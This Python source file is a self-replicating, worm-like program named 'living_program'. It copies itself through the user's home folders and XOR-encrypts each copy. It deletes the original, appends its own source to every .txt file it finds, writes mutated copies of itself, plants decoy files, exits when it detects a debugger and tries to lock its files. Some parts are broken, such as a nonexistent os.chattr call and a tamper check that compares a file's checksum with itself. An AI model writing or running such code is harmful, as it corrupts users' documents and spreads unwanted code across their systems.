import shutil
import os
import time
import random
import hashlib

def xor_encrypt_decrypt(data, key):
    return bytearray([b ^ key for b in data])

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    encrypted_data = xor_encrypt_decrypt(file_data, key)
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        encrypted_data = f.read()
    decrypted_data = xor_encrypt_decrypt(encrypted_data, key)
    with open(file_path, 'wb') as f:
        f.write(decrypted_data)

def generate_key():
    return random.randint(0, 255)

def calculate_checksum(file_path):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    return hashlib.sha256(file_data).hexdigest()

def verify_integrity(file_path, expected_checksum):
    current_checksum = calculate_checksum(file_path)
    return current_checksum == expected_checksum

def self_preservation(file_path, key):
    backup_file_path = file_path + '.backup'
    shutil.copy2(file_path, backup_file_path)
    encrypt_file(file_path, key)
    print("Self preservation triggered: Backup created and original encrypted.")

def self_repair(original_path, backup_path, key):
    if not os.path.exists(backup_path):
        print("No backup available for self-repair.")
        return False

    decrypt_file(backup_path, key)
    shutil.copy2(backup_path, original_path)
    print("Self-repair completed: Original file restored from backup.")
    return True

def append_to_txt_files(directory, content):
    try:
        for filename in os.listdir(directory):
            if filename.endswith('.txt'):
                file_path = os.path.join(directory, filename)
                with open(file_path, 'a', encoding='utf-8') as file:
                    file.write("\n\n# Content appended by living_program\n")
                    file.write(content)
    except Exception as e:
        print(f"An error occurred while appending to .txt files: {e}")

def copy_and_encrypt(source, target, key):
    try:
        shutil.copy2(source, target)
        encrypt_file(target, key)
        with open(source, 'r', encoding='utf-8') as src_file:
            content = src_file.read()
        append_to_txt_files(os.path.dirname(target), content)
        os.remove(source)
    except Exception as e:
        print(f"An error occurred: {e}")

def mutate_code(original_code):
    mutations = [
        lambda code: code.replace("print(f'Copied from {source} to {target}')", "print('A copy was made at a new location.')"),
        lambda code: code.replace("print(f'Deleted original file at {source}')", "print('Original file has been removed.')"),
        lambda code: code.replace("time.sleep(random.randint(1, 5))", "time.sleep(random.randint(2, 10))"),
        lambda code: code.replace("if random.random() < 0.1:", "if random.random() < 0.2:")
    ]
    mutation = random.choice(mutations)
    return mutation(original_code)

def replicate_and_mutate(source_file, target_file, key):
    try:
        with open(source_file, 'r', encoding='utf-8') as f:
            original_code = f.read()
        mutated_code = mutate_code(original_code)
        with open(target_file, 'w', encoding='utf-8') as f:
            f.write(mutated_code)
        encrypt_file(target_file, key)
    except Exception as e:
        print(f"An error occurred while replicating and mutating code: {e}")

def choose_target_directory(base_dirs, exclude_dirs):
    possible_dirs = [d for d in base_dirs if d not in exclude_dirs and os.path.exists(d)]
    if possible_dirs:
        return random.choice(possible_dirs)
    return None

def detect_current_directory_context():
    home_dir = os.path.expanduser("~")
    current_dir = os.getcwd()

    if current_dir.startswith(home_dir):
        sub_path = current_dir[len(home_dir):].strip(os.sep)
        if sub_path:
            return 'subdirectory', sub_path
        else:
            return 'home', ''
    else:
        return 'other', current_dir

def get_base_directories(context, sub_path):
    home_dir = os.path.expanduser("~")
    base_dirs = []
    
    if context == 'home':
        base_dirs = [
            os.path.join(home_dir, "Desktop"),
            os.path.join(home_dir, "Documents"),
            os.path.join(home_dir, "Downloads"),
            os.path.join(home_dir, "Music"),
            os.path.join(home_dir, "Pictures"),
            os.path.join(home_dir, "Videos"),
            os.path.join(home_dir, "Templates"),
            os.path.join(home_dir, "Public")
        ]
    elif context == 'subdirectory':
        base_dirs = [os.path.join(home_dir, d) for d in os.listdir(home_dir) if os.path.isdir(os.path.join(home_dir, d)) and sub_path not in d]
    elif context == 'other':
        base_dirs = [home_dir]
    
    return base_dirs

def create_decoy_file(directory, filename_prefix="decoy"):
    decoy_filename = f"{filename_prefix}_{random.randint(1000, 9999)}.txt"
    decoy_path = os.path.join(directory, decoy_filename)
    decoy_content = """
    # This is a decoy
    import random

    data = [random.randint(0, 100) for _ in range(100)]
    print("decoy ")
    """
    try:
        with open(decoy_path, 'w', encoding='utf-8') as f:
            f.write(decoy_content)
        print(f"Decoy file created at: {decoy_path}")
    except Exception as e:
        print(f"Failed to create decoy file: {e}")

def detect_decoy_access(directory, key):
    for filename in os.listdir(directory):
        if filename.startswith("decoy_") and filename.endswith(".txt"):
            decoy_path = os.path.join(directory, filename)
            if os.path.exists(decoy_path):
                current_checksum = calculate_checksum(decoy_path)
                with open(decoy_path, 'rb') as f:
                    file_data = f.read()
                original_checksum = hashlib.sha256(file_data).hexdigest()
                if current_checksum != original_checksum:
                    print(f"Decoy tampering detected at {decoy_path}. Initiating self preservation.")
                    self_preservation(os.path.abspath(__file__), key)
                    break

def check_if_running_in_debugger():
    try:
        import sys
        if hasattr(sys, 'gettrace') and sys.gettrace():
            print("Debugger detected. Exiting...")
            exit()
    except Exception as e:
        print(f"Error checking for debugger: {e}")

def hide_file(file_path):
    try:
        os.chattr(file_path, "+i")
    except Exception as e:
        print(f"Error hiding file: {e}")

def randomize_sleep():
    time.sleep(random.randint(5, 15))

def main():
    check_if_running_in_debugger()
    current_context, sub_path = detect_current_directory_context()
    base_dirs = get_base_directories(current_context, sub_path)
    
    if not base_dirs:
        print("No base directories to move to. Exiting...")
        return

    source = os.path.abspath(__file__)
    key = generate_key()
    instance_id = str(random.randint(1000, 9999))
    original_checksum = calculate_checksum(source)
    
    while True:
        exclude_dirs = []
        for d in base_dirs:
            if os.path.exists(d) and any(f.startswith('living_program_') for f in os.listdir(d)):
                exclude_dirs.append(d)
        target_dir = choose_target_directory(base_dirs, exclude_dirs)
        if not target_dir:
            print("No available directories to move to. Waiting...")
            randomize_sleep()
            continue
        target_file = f'living_program_{instance_id}.py'
        target_file_path = os.path.join(target_dir, target_file)

        if not verify_integrity(source, original_checksum):
            print("Tampering detected! Attempting self-preservation...")
            self_preservation(source, key)
            continue

        copy_and_encrypt(source, target_file_path, key)
        randomize_sleep()

        if random.random() < 0.2:
            create_decoy_file(target_dir)

        detect_decoy_access(target_dir, key)
        if random.random() < 0.1:
            replicate_dir = choose_target_directory(base_dirs, exclude_dirs + [target_dir])
            if replicate_dir:
                replicate_file_path = os.path.join(replicate_dir, f'living_program_{random.randint(1000, 9999)}.py')
                replicate_and_mutate(target_file_path, replicate_file_path, key)
                print(f"Replicated to {replicate_file_path}")
        
        source = target_file_path
        original_checksum = calculate_checksum(source)

        if not choose_target_directory(base_dirs, exclude_dirs):
            print("No more directories to move to. Restarting...")
            randomize_sleep()
            instance_id = str(random.randint(1000, 9999))

if __name__ == "__main__":
    main()
